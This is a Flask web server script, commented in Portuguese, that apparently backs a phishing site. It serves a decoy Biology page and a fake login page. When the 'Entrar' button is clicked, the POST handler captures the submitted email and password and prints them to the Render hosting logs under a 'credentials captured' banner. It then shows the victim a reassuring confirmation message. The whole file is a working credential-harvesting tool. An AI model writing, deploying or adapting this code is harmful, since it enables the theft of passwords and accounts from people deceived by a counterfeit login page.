from flask import Flask, request, send_from_directory
import os

app = Flask(__name__)

# Define que a pasta principal onde estão os arquivos HTML é a mesma do script
DIRETORIO_ATUAL = os.path.abspath(os.path.dirname(__file__))

# ROTA 1: Quando entra no link principal, abre o site de Biologia (index.html)
@app.route('/')
def pagina_principal():
    if os.path.exists(os.path.join(DIRETORIO_ATUAL, 'index.html')):
        return send_from_directory(DIRETORIO_ATUAL, 'index.html')
    return "<h1>Erro: Arquivo index.html nao encontrado no servidor.</h1>", 404

# ROTA 2: Quando clica no link de login, abre a sua tela verde de captura
@app.route('/login.html', methods=['GET'])
def pagina_login():
    if os.path.exists(os.path.join(DIRETORIO_ATUAL, 'login.html')):
        return send_from_directory(DIRETORIO_ATUAL, 'login.html')
    return "<h1>Erro: Arquivo login.html nao encontrado no servidor.</h1>", 404

# ROTA 3: Executada no exato segundo em que o botão "Entrar" é clicado na tela verde
@app.route('/login.html', methods=['POST'])
def capturar_dados():
    email = request.form.get('email')
    senha = request.form.get('password')
    
    # EXIBE OS DADOS EXCLUSIVAMENTE NA ABA "LOGS" DO PAINEL DO RENDER
    print("\n" + "="*50)
    print("🚨 MONITOR EM NUVEM: CREDENCIAIS CAPTURADAS! 🚨")
    print(f"📧 E-mail / Usuário: {email}")
    print(f"🔑 Senha Digitada:   {senha}")
    print("="*50 + "\n")
    
    return """
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>Acesso Registrado</title></head>
    <body style="font-family:Arial; text-align:center; padding-top:100px; background:#f4f6f9; color:#2c3e50;">
        <div style="background:white; padding:40px; display:inline-block; border-radius:4px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
            <h2>✅ Autenticação Processada</h2>
            <p>Os dados de teste foram recebidos e validados pelo monitor em nuvem.</p>
            <p style="color:#7f8c8d; font-size:14px;">Verifique a aba 'Logs' no seu painel do Render para ver o registro.</p>
        </div>
    </body>
    </html>
    """

# Permite que o servidor dinâmico encontre imagens das pastas _files se houver
@app.route('/<path:path>')
def enviar_arquivos_estaticos(path):
    return send_from_directory(DIRETORIO_ATUAL, path)

if __name__ == '__main__':
    porta = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=porta)

